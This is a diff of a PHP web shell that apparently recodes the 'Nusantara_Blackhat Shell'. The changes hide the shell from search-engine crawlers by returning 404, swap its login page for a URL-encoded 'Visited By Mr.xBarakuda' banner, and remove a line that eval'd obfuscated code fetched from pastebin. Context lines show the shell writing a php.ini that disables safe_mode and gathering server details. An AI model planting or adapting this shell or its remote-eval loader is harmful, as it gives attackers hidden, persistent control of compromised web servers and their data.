@@ -10,87 +10,25 @@ $katasandi = 'fddd7dce121719c9aab2ded76867d2f9';
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
+@ini_set('display_errors',0);
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
+// Fuction biar gak kecache sama google //
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    $userAgents = array("Googlebot", "Google", "Robots", "IExplorer", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
         header('HTTP/1.0 404 Not Found');
         exit;
     }
 }
- 
 function login_shell() {
 ?>
-<html>
-<head>
-<title>XHAMSTER</title>
-<style type="text/css">
-html { margin: 30px auto; background: black;}
-pre {color: cyan;}
-input[type=password]{background: black; color: cyan; margin: 0 10px; font-size: 13px; text-align: center; border: black;}
-input[type=submit]{background: black; color: red; margin: 0 4px; font-size: 13px; font-weight: bold;border: 1px solid gray; cursor: pointer; -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px;}
-.kuda{
--webkit-animation-name: blinker;
--webkit-animation-duration: 3s;
--webkit-animation-timing-function: linear;
--webkit-animation-iteration-count: infinite;
-
--moz-animation-name: blinker;
--moz-animation-duration: 2s;
--moz-animation-timing-function: linear;
--moz-animation-iteration-count: infinite;
-
-animation-name: blinker;
-animation-duration: 1s;
-animation-timing-function: linear;
-animation-iteration-count: infinite;
-}
-@-moz-keyframes blinker {  
-0% { opacity: 1.0; }
-50% { opacity: 0.0; }
-100% { opacity: 1.0; }
-}
-@-webkit-keyframes blinker {  
-0% { opacity: 1.0; }
-50% { opacity: 0.0; }
-100% { opacity: 1.0; }
-}
-@keyframes blinker {  
-0% { opacity: 1.0; }
-50% { opacity: 0.0; }
-100% { opacity: 1.0; }
-}
-</style></head>
-<body>
-<header>
-<center>
-<form method="post"><input type="password" name="pass"></form>
-<br>
-<pre class="kuda">
-
-
- __    __  __                        __            __    __ 
-/  |  /  |/  |                      /  |          /  |  /  |
-$$ |  $$ |$$ |   __  __    __   ____$$ |  ______  $$ |  $$ |
-$$  \/$$/ $$ |  /  |/  |  /  | /    $$ | /      \ $$  \/$$/ 
- $$  $$<  $$ |_/$$/ $$ |  $$ |/$$$$$$$ | $$$$$$  | $$  $$<  
-  $$$$  \ $$   $$<  $$ |  $$ |$$ |  $$ | /    $$ |  $$$$  \ 
- $$ /$$  |$$$$$$  \ $$ \__$$ |$$ \__$$ |/$$$$$$$ | $$ /$$  |
-$$ |  $$ |$$ | $$  |$$    $$/ $$    $$ |$$    $$ |$$ |  $$ |
-$$/   $$/ $$/   $$/  $$$$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ 
-                                                            
-                                                            
-                                                            
-</pre>
-<br>
-<form method="jembut"><input type="password" name="pass" style="border: 1px dotted red"><input type="submit" name="submit" value="LOGIN"></form>
-</center></header></body></html>
+<script language='javascript'>
+document.write(unescape('%3c%68%74%6d%6c%3e%20%3c%68%65%61%64%3e%20%3c%74%69%74%6c%65%3e%58%48%41%4d%53%54%45%52%3c%2f%74%69%74%6c%65%3e%20%3c%73%74%79%6c%65%20%74%79%70%65%3d%22%74%65%78%74%2f%63%73%73%22%3e%20%40%69%6d%70%6f%72%74%20%75%72%6c%28%27%68%74%74%70%73%3a%2f%2f%66%6f%6e%74%73%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%63%73%73%3f%66%61%6d%69%6c%79%3d%49%63%65%62%65%72%67%27%29%3b%20%68%74%6d%6c%20%7b%20%6d%61%72%67%69%6e%3a%20%35%30%70%78%20%61%75%74%6f%3b%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%7d%20%70%72%65%20%7b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%27%49%63%65%62%65%72%67%27%3b%20%63%6f%6c%6f%72%3a%20%63%79%61%6e%3b%20%7d%20%69%6e%70%75%74%5b%74%79%70%65%3d%70%61%73%73%77%6f%72%64%5d%20%7b%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%63%6f%6c%6f%72%3a%20%63%79%61%6e%3b%20%6d%61%72%67%69%6e%3a%20%30%20%31%30%70%78%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%33%70%78%3b%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%63%65%6e%74%65%72%3b%20%62%6f%72%64%65%72%3a%20%62%6c%61%63%6b%3b%20%7d%20%69%6e%70%75%74%5b%74%79%70%65%3d%73%75%62%6d%69%74%5d%7b%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%63%6f%6c%6f%72%3a%20%72%65%64%3b%20%6d%61%72%67%69%6e%3a%20%30%20%34%70%78%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%33%70%78%3b%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%62%6f%6c%64%3b%62%6f%72%64%65%72%3a%20%31%70%78%20%73%6f%6c%69%64%20%67%72%61%79%3b%20%63%75%72%73%6f%72%3a%20%70%6f%69%6e%74%65%72%3b%20%2d%6d%6f%7a%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%6b%68%74%6d%6c%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%7d%20%2e%6b%75%64%61%7b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%33%73%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%32%73%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%20%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%31%73%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%7d%20%40%2d%6d%6f%7a%2d%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%40%2d%77%65%62%6b%69%74%2d%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%20%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%40%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%20%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%3c%2f%73%74%79%6c%65%3e%20%3c%2f%68%65%61%64%3e%20%3c%62%6f%64%79%3e%20%3c%63%65%6e%74%65%72%3e%20%3c%66%6f%72%6d%20%6d%65%74%68%6f%64%3d%22%70%6f%73%74%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%22%20%73%74%79%6c%65%3d%22%63%6f%6c%6f%72%3a%20%62%6c%61%63%6b%3b%22%3e%3c%2f%66%6f%72%6d%3e%20%3c%62%72%3e%20%20%20%20%20%3c%68%31%3e%20%20%20%20%20%20%20%20%20%3c%70%72%65%20%63%6c%61%73%73%3d%22%6b%75%64%61%22%3e%20%56%69%73%69%74%65%64%20%42%79%20%4d%72%2e%78%42%61%72%61%6b%75%64%61%20%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%20%23%42%61%62%62%79%20%43%79%62%65%72%20%54%65%61%6d%20%20%20%20%20%20%20%20%20%3c%2f%70%72%65%3e%20%20%20%20%20%3c%2f%68%31%3e%20%3c%66%6f%72%6d%20%6d%65%74%68%6f%64%3d%22%6d%6d%6b%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%22%3e%3c%2f%66%6f%72%6d%3e%20%3c%2f%63%65%6e%74%65%72%3e%20%3c%2f%62%6f%64%79%3e'));
+</script>
 <?php
-eval(str_rot13(gzinflate(base64_decode(file_get_contents('https://pastebin.com/raw/8DfLS1Q0')))));
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
@@ -143,7 +81,7 @@ text-align: center;
 color: white;
 }
 table, th, td {
-border-collapse: separate;
+border-collapse: collapse;
 background: transparent;
 font-family: 'Share Tech Mono';
 font-size: 12.8px;
@@ -243,9 +181,15 @@ animation-iteration-count: infinite;
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
-</style></head>
+    </style>
+</head>
 <?php
-if (file_exists("php.ini")) {
+////////////////////////////////////////////////////////////////////////
+// Kalo mau recode lagi silahkan.                                    //
+// Tapi yang kreatif ya gan, jangan cuma ganti background nya saja. //
+// Recoded Nusantara_Blackhat Shell By Mr.xBarakuda                //
+////////////////////////////////////////////////////////////////////
+if(file_exists('php.ini')) {
 } else {
 $img = fopen('php.ini', 'w');
 $sec = "safe_mode = OFF
@@ -480,7 +424,7 @@ $orang_gans = '8y3Sq2NXLFfMLlpWBAA=';
 $kernel = php_uname();
 $ip = gethostbyname($_SERVER['HTTP_HOST']);
 $sport = $_SERVER['SERVER_PORT'];
-$admin_id= $_SERVER['SERVER_ADMIN'];
+$admin_id = $_SERVER['SERVER_ADMIN'];
 $ssoftware = $_SERVER['SERVER_SOFTWARE'];
 $dir = str_replace("\\","/",$dir);
 $scdir = explode("/", $dir);
@@ -4675,7 +4619,7 @@ elseif($_GET['do'] == 'auto_dwp2') {
         }
       echo "</table>";
         if(!is_readable($dir)) {
-            //
+
         } else {
 echo "<center><hr color=deepskyblue>
 <form>
@@ -4707,7 +4651,7 @@ echo "<center><hr color=deepskyblue>
 </form>
 </center>";
     }
-echo "<center>Copyright &copy; ".date("Y")." <a href='https://instagram.com/x_barakuda'><font color=deepskyblue>".$gue."</a></font><font color=red> #</font><font color=white> Recoded From </font><font color=deepskyblue>Nusantara_BlackHat Shell</font></center>";
+echo "<center>Copyright &copy; ".date("Y")." <a href='https://instagram.com/x_barakuda' target='_blank'><font color=deepskyblue>".$gue."</a></font><font color=red> #</font><font color=white> Recoded From </font><font color=deepskyblue>Nusantara_BlackHat Shell</font></center>";
 }
 ?>
 </body>
